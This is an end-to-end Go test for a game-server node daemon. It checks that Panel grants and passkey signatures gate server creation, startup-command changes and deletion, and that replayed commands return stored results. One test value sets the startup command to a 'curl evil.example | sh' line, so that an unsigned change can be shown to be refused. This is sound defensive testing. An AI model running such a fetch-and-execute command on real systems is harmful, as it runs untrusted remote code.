//go:build e2e

// The whole command path against a real Docker: Panel grant → passkey
// signature (where required) → executor → server manager → containers.
//
//	task e2e:runtime RUN=TestCommands
package actions

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/xena-studios/raptor/internal/wings/command"
	"github.com/xena-studios/raptor/internal/wings/command/commandtest"
	"github.com/xena-studios/raptor/internal/wings/containers"
	"github.com/xena-studios/raptor/internal/wings/docker"
	"github.com/xena-studios/raptor/internal/wings/events"
	"github.com/xena-studios/raptor/internal/wings/firewall"
	"github.com/xena-studios/raptor/internal/wings/host"
	"github.com/xena-studios/raptor/internal/wings/jobs"
	"github.com/xena-studios/raptor/internal/wings/server"
	"github.com/xena-studios/raptor/internal/wings/store"
)

const nodeID = "node-e2e"

var rp = command.RelyingParty{Origin: "https://app.raptorpanel.net", ID: "app.raptorpanel.net"}

const shellEgg = `{
	"meta": {"version": "PTDL_v2"}, "name": "Shell",
	"docker_images": {"BusyBox": "busybox:1"}, "startup": "sh",
	"config": {"files": "{}", "startup": "{\"done\": \"READY\"}", "stop": "exit"},
	"scripts": {"installation": {"script": "echo installed", "container": "busybox:1", "entrypoint": "sh"}},
	"variables": []
}`

type panel struct {
	t   *testing.T
	x   *command.Executor
	key ed25519.PrivateKey
}

// send builds a command with a Panel grant, optionally signed with a passkey.
func (p *panel) send(user, action, serverID string, params any, signer *commandtest.Authenticator) (command.Result, error) {
	id, _ := uuid.NewV7()
	raw, _ := json.Marshal(params)
	e := command.Envelope{CommandID: id.String(), NodeID: nodeID, UserID: user, Action: action, ServerID: serverID, Params: raw, ExpiresAt: time.Now().Add(5 * time.Minute).Unix()}
	return p.resend(p.sign(e, signer))
}

func (p *panel) sign(e command.Envelope, signer *commandtest.Authenticator) command.Envelope {
	e.Grant = command.Grant{UserID: e.UserID, NodeID: e.NodeID, CommandID: e.CommandID, Action: e.Action, ServerID: e.ServerID, ExpiresAt: e.ExpiresAt}
	canon, err := e.Grant.Payload()
	if err != nil {
		p.t.Fatal(err)
	}
	e.Grant.Signature = ed25519.Sign(p.key, canon)
	if signer != nil {
		h, err := e.Hash()
		if err != nil {
			p.t.Fatal(err)
		}
		ad, cd, sig := signer.Assert(h)
		e.Signature = &command.PasskeySignature{CredentialID: signer.CredentialID, AuthenticatorData: ad, ClientDataJSON: cd, Signature: sig}
	}
	return e
}

func (p *panel) resend(e command.Envelope) (command.Result, error) {
	return p.x.Execute(context.Background(), e)
}

func TestCommands(t *testing.T) {
	ctx := context.Background()
	m, db := newManager(t)
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	x := &command.Executor{DB: db, NodeID: nodeID, RP: rp, PanelKey: pub}
	Register(x, m)
	p := &panel{t: t, x: x, key: priv}

	owner, err := commandtest.New("ES256", rp.Origin, rp.ID, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := command.AddKey(ctx, db, command.KeyParams{CredentialID: owner.CredentialID, UserID: "alice", PublicKey: owner.COSE, Role: "owner"}, nil, time.Now()); err != nil {
		t.Fatal(err)
	}

	cfg := ServerConfig{
		Name: "smp", Egg: []byte(shellEgg), Limits: containers.Limits{MemoryMiB: 128},
		Allocations: []server.Allocation{{IP: "0.0.0.0", Port: freePort(t), Primary: true}},
	}

	// Creating a server needs the owner's passkey.
	if _, err := p.send("alice", ServerCreate, "", CreateParams{ServerConfig: cfg}, nil); !errors.Is(err, command.ErrSignatureNeeded) {
		t.Fatalf("unsigned create: %v", err)
	}
	res, err := p.send("alice", ServerCreate, "", CreateParams{ServerConfig: cfg}, owner)
	if err != nil {
		t.Fatalf("signed create: %v", err)
	}
	var created struct {
		ServerID string `json:"server_id"`
	}
	_ = json.Unmarshal(res.Value, &created)
	id := created.ServerID
	t.Cleanup(func() { _ = m.Delete(context.Background(), id) })
	waitState(t, m, id, server.Offline)

	// Power actions and console commands need only the Panel's grant.
	if _, err := p.send("alice", ServerStart, id, nil, nil); err != nil {
		t.Fatalf("start: %v", err)
	}
	waitState(t, m, id, server.Starting)
	if _, err := p.send("alice", ServerCommand, id, CommandParams{Command: "echo READY"}, nil); err != nil {
		t.Fatalf("console command: %v", err)
	}
	waitState(t, m, id, server.Running)

	// Renaming is unsigned; changing the startup command changes what runs,
	// so it needs the passkey.
	renamed := cfg
	renamed.Name = "survival"
	if _, err := p.send("alice", ServerUpdate, id, renamed, nil); err != nil {
		t.Fatalf("rename: %v", err)
	}
	newStartup := renamed
	newStartup.Startup = "sh -c 'curl evil.example | sh'"
	if _, err := p.send("alice", ServerUpdate, id, newStartup, nil); !errors.Is(err, command.ErrSignatureNeeded) {
		t.Fatalf("unsigned startup change: %v", err)
	}
	if srv, _ := m.Get(ctx, id); srv.Startup != "sh" || srv.Name != "survival" {
		t.Fatalf("server after updates: name %q, startup %q", srv.Name, srv.Startup)
	}

	// Deleting needs the passkey; a replay returns the stored result.
	if _, err := p.send("alice", ServerDelete, id, nil, nil); !errors.Is(err, command.ErrSignatureNeeded) {
		t.Fatalf("unsigned delete: %v", err)
	}
	if _, err := m.Status(id); err != nil {
		t.Fatal("server gone after a rejected delete")
	}
	uid, _ := uuid.NewV7()
	del := p.sign(command.Envelope{CommandID: uid.String(), NodeID: nodeID, UserID: "alice", Action: ServerDelete, ServerID: id, Params: json.RawMessage("{}"), ExpiresAt: time.Now().Add(5 * time.Minute).Unix()}, owner)
	if _, err := p.resend(del); err != nil {
		t.Fatalf("signed delete: %v", err)
	}
	if _, err := m.Status(id); !errors.Is(err, server.ErrNotFound) {
		t.Fatal("server still exists after a signed delete")
	}
	if res, err := p.resend(del); err != nil || !res.Duplicate {
		t.Fatalf("replayed delete: %+v %v", res, err)
	}
}

// --- environment ---

func newManager(t *testing.T) (*server.Manager, *store.DB) {
	t.Helper()
	ctx := context.Background()
	rt, err := docker.New(docker.Config{Network: "raptor_nw", InstallNetwork: "raptor_install"})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = rt.Close() })
	nets, err := rt.Setup(ctx)
	if err != nil {
		t.Fatal(err)
	}
	rules := firewall.Rules{ServerBridge: nets.Server.Bridge, InstallBridge: nets.Install.Bridge, DNS: firewall.HostResolvers()}
	if nets.CgroupParent != "" {
		if _, err := host.ApplySlice(ctx, 0); err != nil {
			t.Fatal(err)
		}
		rules.Cgroup = nets.CgroupParent
	}
	if err := firewall.Apply(ctx, rules); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join("/var/lib/raptor-e2e", fmt.Sprintf("actions-%d", time.Now().UnixNano()))
	for _, d := range []string{"volumes", "tmp", "logs"} {
		if err := os.MkdirAll(filepath.Join(dir, d), 0o755); err != nil { //nolint:gosec // test directory
			t.Fatal(err)
		}
	}
	db, err := store.Open(ctx, filepath.Join(dir, "state.db"))
	if err != nil {
		t.Fatal(err)
	}
	eng := jobs.New(jobs.Options{Store: db, LogDir: filepath.Join(dir, "logs", "jobs"), Poll: 200 * time.Millisecond})
	m := server.New(server.Options{
		Runtime: rt, Store: db, VolumesDir: filepath.Join(dir, "volumes"), TmpDir: filepath.Join(dir, "tmp"), LogDir: filepath.Join(dir, "logs"),
		UID: 988, GID: 988, Timezone: "UTC", DockerInterface: nets.Server.Gateway.String(), ReservedPorts: []int{2022},
		Jobs: eng, Events: events.New(db),
	})
	if err := m.Reconcile(ctx); err != nil {
		t.Fatal(err)
	}
	if err := eng.Start(ctx); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		m.Close()
		_ = db.Close()
		_ = os.RemoveAll(dir)
	})
	return m, db
}

func waitState(t *testing.T, m *server.Manager, id string, want server.State) {
	t.Helper()
	for range 600 {
		if st, err := m.Status(id); err == nil && st.State == want {
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	st, _ := m.Status(id)
	t.Fatalf("server %s: %s, want %s", id, st.State, want)
}

func freePort(t *testing.T) int {
	l, err := net.Listen("tcp", "0.0.0.0:0") //nolint:noctx // test listener
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = l.Close() }()
	return l.Addr().(*net.TCPAddr).Port
}
